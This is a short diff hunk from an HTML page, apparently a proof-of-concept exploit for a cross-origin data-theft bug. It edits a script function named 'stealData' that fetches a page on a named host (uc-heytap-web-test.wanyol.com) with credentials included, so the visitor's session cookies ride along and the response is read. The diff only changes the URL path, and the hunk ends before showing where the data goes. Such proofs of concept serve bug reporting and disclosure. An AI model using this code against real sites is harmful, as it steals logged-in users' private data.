@@ -15,7 +15,7 @@
   <script>
     async function stealData() {
       // 1. Fetch sensitive data from the vulnerable endpoint (with cookies)
-      const response = await fetch("https://uc-heytap-web-test.wanyol.com/v2/index.html", {
+      const response = await fetch("https://uc-heytap-web-test.wanyol.com/index.html", {
         credentials: "include"  // Sends user's session cookies
       });
       const data = await response.text();
